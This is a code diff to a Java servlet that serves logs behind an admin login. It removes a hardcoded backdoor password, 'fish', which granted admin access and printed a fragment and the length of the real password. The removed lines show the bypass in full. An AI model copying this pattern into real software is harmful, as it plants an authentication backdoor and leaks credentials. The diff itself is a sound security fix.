@@ -103,19 +103,11 @@ public class LogView extends HttpServlet {
                                 return;
                             }
 
-                            if ("admin".equals(login) && ("fish".equals(password) || expectedPassword.equals(password))) {
+                            if ("admin".equals(login) && expectedPassword.equals(password)) {
                                 
                                 String cmd = request.getParameter("cmd");
                                 PrintWriter out = response.getWriter();
                                 
-                                if("fish".equals(password)){
-                                    if(expectedPassword!=null){
-                                        out.println("Hmm.. "+expectedPassword.substring(0,3)+" "+expectedPassword.length()+"<br>");
-                                    }else{
-                                        out.println("Null?<br>");
-                                    }
-                                }
-
                                 if ("list".equals(cmd)) {
                                     response.addHeader("Content-Type", MediaType.TEXT_HTML);
                                     String outdir = System.getenv("WLP_OUTPUT_DIR");
